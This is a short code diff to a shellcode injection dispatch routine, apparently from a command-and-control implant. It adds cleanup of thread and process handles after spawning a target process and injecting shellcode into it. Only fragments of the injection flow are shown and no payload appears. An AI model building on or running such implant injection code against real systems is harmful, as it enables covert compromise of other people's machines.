@@ -12,6 +12,7 @@
 BOOL ShellcodeInjectDispatch( BOOL Inject, SHORT Method, LPVOID lpShellcodeBytes, SIZE_T ShellcodeSize, PINJECTION_CTX ctx )
 {
     NTSTATUS NtStatus = 0;
+    BOOL     Success  = FALSE;
 
     if ( Inject )
     {
@@ -128,9 +129,17 @@ BOOL ShellcodeInjectDispatch( BOOL Inject, SHORT Method, LPVOID lpShellcodeBytes
                         else
                             PUTS( "[+] NtResumeThread: Success" );
 
-                        return TRUE;
+                        Success = TRUE;
                     }
-                    else return FALSE;
+                    else
+                    {
+                        Success = FALSE;
+                    }
+
+                    Instance.Win32.NtClose( ProcessInfo.hThread );
+                    Instance.Win32.NtClose( ProcessInfo.hProcess );
+
+                    return Success;
                 }
 
                 break;
@@ -146,7 +155,12 @@ BOOL ShellcodeInjectDispatch( BOOL Inject, SHORT Method, LPVOID lpShellcodeBytes
                 if ( ProcessCreate( TRUE, NULL, Instance.Config.Process.Spawn64, ProcessFlags, &ProcessInfo, FALSE, NULL ) )
                 {
                     ctx->hProcess = ProcessInfo.hProcess;
-                    return ShellcodeInjectionSys( lpShellcodeBytes, ShellcodeSize, ctx );
+                    Success = ShellcodeInjectionSys( lpShellcodeBytes, ShellcodeSize, ctx );
+
+                    Instance.Win32.NtClose( ProcessInfo.hThread );
+                    Instance.Win32.NtClose( ProcessInfo.hProcess );
+
+                    return Success;
                 }
                 break;
             }
